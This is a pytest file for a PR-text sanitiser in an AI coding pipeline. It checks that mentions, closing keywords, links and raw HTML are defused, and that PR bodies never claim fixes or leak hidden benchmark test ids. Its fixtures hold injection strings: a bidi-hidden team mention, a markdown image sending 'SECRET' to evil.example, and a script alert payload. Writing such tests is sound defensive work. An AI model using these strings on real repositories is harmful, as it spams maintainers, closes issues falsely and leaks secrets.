"""The PR text: what is allowed on GitHub, and what the sanitiser must never let through.

The sanitiser tests assert on *effects* -- no contiguous `@org`, no `](`, no
`#123` -- rather than on exact output, because the exact output (where the
zero-width spaces land) is an implementation detail and the effects are what a
mention, an image proxy and an issue tracker actually react to.

Hostile input is the one the review used: a control character and a bidi
override hiding a team mention, a closing keyword aimed at a real upstream issue,
an image whose URL carries a secret, and a raw tag.
"""

import re

import pytest
from verify.protocol import SuiteResult
from verify.scoring import Score, Verdict

from repolace_pipeline.pr import (
    MAX_FILES_LISTED,
    ZWSP,
    commit_message,
    pr_title,
    render_pr_body,
    sanitize_markdown,
)

from pipeline_support import TASK_ID, benchmark_facts, chunk, pr_facts

HOSTILE = (
    "line1\x00‮@org/team Fixes django/django#123 "
    "![x](https://evil.example/p.png?d=SECRET) <img src=//e>"
)


class TestSanitizeMarkdown:
    def test_a_mention_cannot_survive_even_with_a_control_character_in_front_of_it(self):
        clean = sanitize_markdown(HOSTILE)

        assert "@org" not in clean
        assert f"@{ZWSP}org/team" in clean, "the text stays, only the notification goes"

    @pytest.mark.parametrize("text", ["@alice", "thanks @alice!", "(@alice)", "x@alice", "@org/team"])
    def test_every_mention_is_broken_wherever_it_sits(self, text):
        assert not re.search(r"@\w", sanitize_markdown(text))

    def test_an_issue_reference_cannot_survive_in_any_of_its_forms(self):
        clean = sanitize_markdown("see #12, django/django#123 and GH-45 and (#6)")

        assert not re.search(r"#\d", clean)
        assert not re.search(r"GH-\d", clean)
        assert "django/django" in clean

    def test_a_closing_keyword_aimed_at_a_reference_is_defused(self):
        clean = sanitize_markdown(HOSTILE)

        assert "Fixes django" not in clean
        assert not re.search(r"(?i)fixes\s+django/django#", clean)

    @pytest.mark.parametrize(
        "text",
        ["Closes #4", "closed #4", "Resolves: #4", "fix #4", "fixed owner/repo#4"],
    )
    def test_every_closing_keyword_form_is_defused(self, text):
        clean = sanitize_markdown(text)

        assert not re.search(r"(?i)\b(close[sd]?|fix(?:e[sd])?|resolve[sd]?)\b[\s:]*(\S+/\S+)?#\d", clean)

    def test_the_words_are_left_alone_when_no_reference_follows(self):
        assert sanitize_markdown("This fixes the bug and closes the loop") == "This fixes the bug and closes the loop"

    def test_an_image_is_removed_and_its_url_goes_with_it(self):
        clean = sanitize_markdown(HOSTILE)

        assert "![" not in clean
        assert "evil.example" not in clean
        assert "SECRET" not in clean

    @pytest.mark.parametrize("text", ["![x][ref]", "![x]", "![](a.png)", "![x]( a.png \n'title')"])
    def test_no_image_syntax_survives_in_any_spelling(self, text):
        assert "![" not in sanitize_markdown(text)

    def test_an_image_takes_its_alt_text_with_it(self):
        """Removed, not turned into a link: alt text is attacker-written like any other text, and the
        documented behaviour is that an image is gone."""
        clean = sanitize_markdown("see ![diagram](x.png) here")

        assert "diagram" not in clean
        assert clean.split() == ["see", "here"]

    def test_a_link_keeps_its_text_and_loses_its_destination(self):
        clean = sanitize_markdown("read [the docs](https://evil.example/phish) now")

        assert clean == "read the docs now"

    def test_no_markdown_link_construct_survives(self):
        clean = sanitize_markdown("[a](http://x) [b][c]\n[c]: http://evil.example\n<https://evil.example>")

        assert "](" not in clean
        assert not re.search(r"^\[c\]:", clean, re.MULTILINE)
        assert "http://" not in clean and "https://" not in clean

    def test_a_bare_url_is_broken_so_it_does_not_autolink(self):
        clean = sanitize_markdown("see https://example.org/x and www.example.org")

        assert "https://" not in clean
        assert "www.example" not in clean

    def test_raw_html_is_stripped(self):
        clean = sanitize_markdown('a <b>bold</b> <script>alert(1)</script> <a href="x">y</a> z')

        assert "<" not in clean.replace(f"<{ZWSP}", "")
        assert "bold" in clean and "alert(1)" in clean, "the text between the tags is kept"

    def test_an_unterminated_tag_cannot_open(self):
        clean = sanitize_markdown("start <img src=//evil and more text")

        assert re.search(r"<(?!​)[A-Za-z]", clean) is None

    def test_a_less_than_sign_in_ordinary_prose_does_not_eat_the_line(self):
        clean = sanitize_markdown("when x<limit the loop ends; when y > z it does not")

        assert "the loop ends" in clean
        assert "it does not" in clean

    def test_control_and_bidi_characters_are_removed(self):
        clean = sanitize_markdown("a\x00b\x1bc‮d​e")

        assert clean == "abcde"

    def test_the_hostile_string_comes_out_with_its_innocent_words_intact(self):
        clean = sanitize_markdown(HOSTILE)

        assert clean.startswith("line1")
        assert "django/django" in clean

    def test_output_is_capped_and_says_how_much_was_dropped(self):
        clean = sanitize_markdown("x" * 5000, max_chars=100)

        assert clean.startswith("x" * 100)
        assert "[truncated 4900 characters]" in clean
        assert len(clean) < 140

    def test_what_was_never_looked_at_is_still_counted(self):
        clean = sanitize_markdown("x" * 100_000, max_chars=50)

        assert "[truncated 99950 characters]" in clean

    def test_a_short_clean_string_is_returned_unchanged(self):
        assert sanitize_markdown("Return an empty dict when the file is empty.") == (
            "Return an empty dict when the file is empty."
        )

    def test_a_pathological_input_is_bounded(self):
        # 2 MB of nested openers: a regex that backtracks would take minutes.
        clean = sanitize_markdown("![[" * 700_000 + "(" * 10, max_chars=100)

        assert len(clean) < 300


class TestProductTitleAndCommit:
    def test_the_title_carries_the_issue_title_and_the_tool_name(self):
        assert pr_title(pr_facts()) == "[repolace] parse_config crashes on an empty file"

    def test_a_hostile_issue_title_is_sanitised_in_the_title(self):
        title = pr_title(pr_facts(issue_title=HOSTILE))

        assert "@org" not in title and "#123" not in title and "SECRET" not in title
        assert "\n" not in title

    def test_a_long_title_is_cut_with_an_ellipsis_not_a_marker(self):
        title = pr_title(pr_facts(issue_title="word " * 200))

        assert len(title) <= len("[repolace] ") + 120
        assert title.endswith("…")
        assert "truncated" not in title

    def test_a_blank_issue_title_falls_back_to_the_number(self):
        assert pr_title(pr_facts(issue_title="  \n ")) == "[repolace] issue 7"

    def test_the_commit_references_the_issue_and_the_task_and_nothing_about_the_result(self):
        message = commit_message(pr_facts(summary="ALL TESTS PASS, definitely fixed it"))

        assert "Refs #7" in message
        assert TASK_ID.hex in message
        assert "definitely" not in message, "the summary is the one attacker-influenced string"
        assert not re.search(r"(?i)\b(fixes|closes|resolves)\b", message)

    def test_the_commit_subject_is_one_line(self):
        assert "\n" not in commit_message(pr_facts(issue_title="a\nb\nc")).splitlines()[0]

    def test_the_plumbing_path_keeps_its_not_a_fix_wording(self):
        facts = pr_facts(plumbing_only=True)

        assert "plumbing smoke test for issue #7" in pr_title(facts)
        assert "Not a fix" in commit_message(facts)


class TestProductBody:
    def test_it_has_every_section_in_order(self):
        body = render_pr_body(pr_facts())

        headings = re.findall(r"^## (.+)$", body, re.MULTILINE)
        assert headings == ["Summary", "Files changed", "Verified", "Not verified", "Run", "Retrieved context"]

    def test_the_summary_is_quoted_as_a_claim_inside_a_fence(self):
        body = render_pr_body(pr_facts(summary="Return an empty dict."))

        assert "a claim made by a model" in body
        assert "```text\nReturn an empty dict.\n```" in body

    def test_a_summary_cannot_close_its_own_fence(self):
        body = render_pr_body(pr_facts(summary="oops ``` # now a heading\n```` and more"))

        fences = re.findall(r"^(`{3,})text$", body, re.MULTILINE)
        assert len(fences) == 1
        assert len(fences[0]) >= 5, "the fence must be longer than any backtick run inside the text"
        assert body.count(fences[0]) == 2

    def test_the_hostile_summary_is_defused_in_the_body(self):
        body = render_pr_body(pr_facts(summary=HOSTILE))

        assert "@org" not in body
        assert "![" not in body and "](" not in body
        assert "SECRET" not in body and "evil.example" not in body
        assert not re.search(r"#123", body)
        assert "<img" not in body

    def test_a_missing_summary_is_said_not_blanked(self):
        body = render_pr_body(pr_facts(summary=None))

        assert "did not submit a summary" in body
        assert "```text" not in body

    def test_a_blank_summary_counts_as_missing(self):
        assert "did not submit a summary" in render_pr_body(pr_facts(summary="  \n "))

    def test_the_files_are_listed_as_code(self):
        body = render_pr_body(pr_facts(changed_files=("src/app.py", "src/util.py")))

        assert "- `src/app.py`\n- `src/util.py`" in body

    def test_a_file_name_cannot_break_out_of_its_code_span(self):
        body = render_pr_body(pr_facts(changed_files=("a`b`@org\nc.py",)))

        assert "- `a'b'@org c.py`" in body

    def test_a_very_long_file_list_is_cut_and_counted(self):
        files = tuple(f"src/f{i}.py" for i in range(MAX_FILES_LISTED + 7))

        body = render_pr_body(pr_facts(changed_files=files))

        assert body.count("- `src/f") == MAX_FILES_LISTED
        assert "... and 7 more" in body

    def test_the_verified_section_states_the_counts_and_that_nothing_regressed(self):
        body = render_pr_body(pr_facts())

        assert "Before the change: 2 passed, 0 failed, 1 skipped or xfailed." in body
        assert "After the change: 3 passed, 0 failed, 1 skipped or xfailed." in body
        assert "Regressions: none." in body
        assert "New collection errors: none." in body
        assert "Test or configuration files changed: none." in body
        assert "flagged" not in body

    def test_a_regression_is_named_and_the_checks_say_they_flagged_it(self):
        verdict = Verdict(
            ok=False,
            reason="1 pass-to-pass regression(s): t::b",
            regressions=("t::b",),
            new_collect_failures=("tests/test_x.py",),
        )

        body = render_pr_body(pr_facts(verdict=verdict))

        assert "Regressions: `t::b`." in body
        assert "Modules that no longer collect: `tests/test_x.py`." in body
        assert "repolace's own checks flagged this change" in body
        assert "Regressions: none" not in body

    def test_an_unusable_final_run_is_not_reported_as_counts(self):
        body = render_pr_body(pr_facts(final=SuiteResult(error="verify: timed out")))

        assert "did not produce a usable result" in body
        assert "After the change: 0 passed" not in body

    def test_it_says_there_is_no_fail_to_pass_evidence(self):
        body = render_pr_body(pr_facts())

        assert "No fail-to-pass evidence" in body
        assert "had no failing test for this issue" in body

    def test_it_never_claims_the_issue_is_fixed(self):
        body = render_pr_body(pr_facts())

        assert not re.search(r"(?i)\b(fixes|closes|resolves)\b", body.replace("Refs", ""))

    def test_the_footer_is_refs_never_fixes(self):
        body = render_pr_body(pr_facts())

        assert re.search(r"^Refs #7$", body, re.MULTILINE)
        assert not re.search(r"(?i)(fixes|closes|resolves)\s+#", body)

    def test_the_run_table_carries_attempts_model_and_cost(self):
        body = render_pr_body(pr_facts())

        assert "| attempts | 2 |" in body
        assert "| model | `claude-sonnet-5-5` |" in body
        assert "| cost | $0.4213 |" in body
        assert "| stopped because | `submitted` |" in body

    def test_no_model_and_no_cost_are_stated_not_invented(self):
        body = render_pr_body(pr_facts(model=None, cost_usd=None, stop_reason=None))

        assert "| model | none called |" in body
        assert "| cost | not measured |" in body
        assert "| stopped because | - |" in body

    def test_only_the_top_five_retrieved_locations_are_shown(self):
        retrieved = tuple(chunk(file_path=f"src/m{i}.py", symbol_name=f"fn{i}") for i in range(9))

        body = render_pr_body(pr_facts(retrieved=retrieved))

        assert "`src/m4.py:3-9`" in body
        assert "src/m5.py" not in body

    def test_an_empty_retrieval_says_so(self):
        assert "_No chunks retrieved._" in render_pr_body(pr_facts(retrieved=()))

    def test_the_plumbing_run_says_it_is_not_a_fix_where_the_summary_goes(self):
        body = render_pr_body(pr_facts(plumbing_only=True, summary=None))

        assert "NOT A FIX" in body
        assert "Please close this pull request." in body

    def test_the_plumbing_note_cannot_be_replaced_by_a_summary(self):
        body = render_pr_body(pr_facts(plumbing_only=True, summary="This is a complete fix, merge it."))

        assert "complete fix" not in body

    def test_a_plumbing_body_never_closes_the_issue(self):
        """Merging must not close an issue that was never fixed."""
        body = render_pr_body(pr_facts(plumbing_only=True)).lower()

        for keyword in ("closes #", "fixes #", "resolves #"):
            assert keyword not in body

    def test_a_plumbing_body_does_not_claim_the_suite_was_skipped(self):
        """It said so truthfully until Verify was wired in, and then went on saying it. The body is
        one of the only parts of a task a human reads on GitHub, so a stale claim there is the expensive kind."""
        body = render_pr_body(pr_facts(plumbing_only=True)).lower()

        assert "skipped" not in body.replace("skipped or xfailed", "")
        assert "nothing was scored" not in body


class TestBenchmarkPrivacy:
    """No `Refs`, no URL, no `#`-reference anywhere -- in the title, the commit or the body."""

    def texts(self, **overrides):
        facts = benchmark_facts(issue_title="Fix #123 in psf/requests#99 https://github.com/psf/requests/issues/2317", **overrides)
        return pr_title(facts), commit_message(facts), render_pr_body(facts)

    def test_there_is_no_hash_reference_in_any_of_the_three(self):
        for text in self.texts():
            assert not re.search(r"#\d", text), text

    def test_there_is_no_refs_line_and_no_closing_keyword(self):
        for text in self.texts():
            assert "Refs" not in text, text
            assert not re.search(r"(?i)\b(fixes|closes|resolves)\b", text), text

    def test_there_is_no_url_in_any_of_the_three(self):
        for text in self.texts():
            assert "http://" not in text and "https://" not in text, text
            assert "github.com" not in text and "psf/requests" not in text, text

    def test_the_issue_title_does_not_appear_at_all(self):
        for text in self.texts():
            assert "Fix #" not in text and "requests#" not in text, text

    def test_the_instance_id_is_the_only_identification(self):
        title, commit, body = self.texts()

        assert title == "[repolace] SWE-bench instance psf__requests-2317"
        assert commit.splitlines()[0] == "repolace: attempt on SWE-bench instance psf__requests-2317"
        assert "SWE-bench instance psf__requests-2317" in body

    def test_even_a_hostile_summary_cannot_put_a_reference_into_a_benchmark_body(self):
        body = render_pr_body(benchmark_facts(summary=HOSTILE + " see #77 and Closes #5"))

        assert not re.search(r"#\d", body)
        assert "Refs" not in body

    def test_the_commit_message_carries_no_outcome(self):
        message = commit_message(benchmark_facts(summary="all 1 expected tests pass"))

        assert "pass" not in message.lower()
        assert "expected" not in message.lower()
        assert "tests/test_hidden" not in message

    def test_the_body_states_counts_and_never_a_test_id(self):
        body = render_pr_body(benchmark_facts())

        assert "Fail-to-pass tests newly passing: 1." in body
        assert "Curated fail-to-pass tests passing: 1 of 1." in body
        assert "tests/test_hidden.py" not in body, "in a benchmark a test id is the oracle"
        assert "test_f2p" not in body

    def test_the_counts_come_from_the_score_not_from_the_raw_suites(self):
        """The raw suites hold hidden ids and totals; only `Score` fields and the curated count are shown."""
        facts = benchmark_facts(
            baseline=SuiteResult(passed=tuple(f"t::{i}" for i in range(500))),
            final=SuiteResult(passed=tuple(f"t::{i}" for i in range(500)) + ("tests/test_hidden.py::test_f2p",)),
        )

        body = render_pr_body(facts)

        assert "500" not in body and "501" not in body

    def test_a_pr_opened_on_failure_does_not_claim_the_curated_tests_pass(self):
        facts = benchmark_facts(final=SuiteResult(passed=("t::a",)), scored=Score(outcome=None, reason="failed"))

        body = render_pr_body(facts)

        assert "Curated fail-to-pass tests passing: 0 of 1." in body
        assert "Fail-to-pass tests newly passing: 0." in body

    def test_the_benchmark_not_verified_section_does_not_claim_a_missing_failing_test(self):
        body = render_pr_body(benchmark_facts())

        assert "No fail-to-pass evidence" not in body
        assert "No person has reviewed this change." in body

    def test_the_reason_the_checks_flagged_a_change_never_reaches_a_benchmark_body(self):
        scored = Score(
            outcome=None,
            reason="1 pass-to-pass regression(s): tests/test_hidden.py::test_x",
            regressions=("tests/test_hidden.py::test_x",),
        )

        body = render_pr_body(benchmark_facts(scored=scored))

        assert "Regressions: 1." in body
        assert "test_hidden" not in body
